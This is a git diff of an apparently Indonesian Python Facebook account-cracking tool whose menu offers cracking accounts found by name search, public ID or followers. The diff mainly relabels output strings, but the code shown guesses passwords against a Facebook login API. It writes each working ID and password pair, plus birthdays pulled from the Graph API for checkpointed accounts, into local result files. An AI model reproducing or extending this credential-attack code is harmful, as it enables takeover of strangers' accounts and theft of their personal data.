@@ -285,14 +285,14 @@ class sunda:
 		print(f" [⭐] Facebook    : {K}facebook/JbFbOld{N}")
 		print(f" [⭐] WhatsApp    : {K}+6281318306972{N}")
 		print( 50 * '=')
-		print(f" [ Selamat datang {K}{nama}{N} ]")
+		print(f" [ Selamat datang {K}{nama}{N} ] ")
 		print( 50 * '=')
 		print(f" [{H}✓{N}] ID FB Anda   : {K}{idfb}{N}")
 		print(f" [{H}✓{N}] IP Anda      : {K}{IP}{N}")
 		print(f" [{H}✓{N}] Status       : {H}Premium{N}")
 		print(f" [{H}✓{N}] Bergabung    : {K}{hari}-{bulan}-{tahun}{N}")
 		print( 50 * '=')
-		print(f" [❓{O} Menu Pilihan{N} ]  ")
+		print(f" [{K}?{O} Menu Pilihan{N} ]  ")
 		print(" %s[%s01%s]. Crack dari Pencarian Nama"%(N,O,N))
 		print(" %s[%s02%s]. Crack dari ID Publik"%(N,O,N))
 		print(" %s[%s03%s]. Crack dari Followers"%(N,O,N))
@@ -653,7 +653,7 @@ class ngewe:
 		elif jembut in["10"]:
 		  __nguh__()
 		  os.system("git pull")
-		  print(f"\n {N}[{H}✓{N}] Berhasil Mengupdate Tools");exit()
+		  print(f"\n{N}[{H}✓{N}] Berhasil Mengupdate Tools, silahkan jalankan kembali Tools nya");exit()
 		elif jembut in["0","00"]:
 			print ('\n')
 			tod()
@@ -753,9 +753,9 @@ class ngewe:
 			send=ses.get(api,params=param, headers={'user-agent': user_agent})
 			if "session_key" in send.text and "EAAA" in send.text:
 				ok+=1
-				print(f"\r{N}[{H}✓{N}]{H} Berhasil                                 \n{N}[{K}×{N}] ID       {M}:{K} {user}                \n{N}[{H}✓{N}] Password {M}:{H} {pw}{N}                \n",end="")
-				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] ID       : {user}\n [✓] Password : {pw}\n")
-				live.append(f" [✓] ID       : {user}\n [✓] Password : {pw}")
+				print(f"\r{N}[{H}✓{N}]{H} OK                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
+				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] ID : {user}\n [✓] PW FB : {pw}\n")
+				live.append(f" [✓] ID : {user}\n [✓] PW FB : {pw}")
 				break
 			elif "www.facebook.com" in send.json()["error_msg"]:
 				cp+=1
@@ -764,16 +764,16 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {user}                \n{N}[{K}×{N}] Password {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
-					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID       : {user}\n [×] Password : {pw}\n [×] TTL      : {ttl}\n")
-					chek.append(f" [×] ID       : {user}\n [×] Password : {pw}\n [×] TTL      : {ttl}")
+					print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
+					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n [×] PW FB : {pw}\n [×] TTL : {ttl}\n")
+					chek.append(f" [×] ID : {user}\n [×] PW FB : {pw}\n [×] TTL : {ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {user}                \n{N}[{K}×{N}] Password {M}:{K} {pw}{N}                \n",end="")
-				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID       : {user}\n [×] Password : {pw}\n")
-				chek.append(f" [×] ID       : {user}\n [×] Password : {pw}")
+				print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n [×] PW FB : {pw}\n")
+				chek.append(f" [×] ID : {user}\n [×] PW FB : {pw}")
 				break
 			else:
 				continue
@@ -817,16 +817,16 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {uid}                \n{N}[{K}×{N}] Password {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
-					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID       : {uid}\n [×] Password : {pw}\n [×] TTL      : {ttl}\n")
-					chek.append(f" [×] ID       : {uid}\n [×] Password : {pw}\n [×] TTL      : {ttl}")
+					print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
+					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n [×] PW FB : {pw}\n [×] TTL : {ttl}\n")
+					chek.append(f" [×] ID : {uid}\n [×] PW FB : {pw}\n [×] TTL : {ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {uid}                \n{N}[{K}×{N}] Password {M}:{K} {pw}{N}                \n",end="")
-				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID       : {uid}\n [×] Password : {pw}\n")
-				chek.append(f" [×] ID       : {uid}\n [×] Password : {pw}")
+				print(f"\r{N}[{K}×{N}]{K} CP                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n [×] PW FB : {pw}\n")
+				chek.append(f" [×] ID : {uid}\n [×] PW FB : {pw}")
 				break
 			else:
 				continue
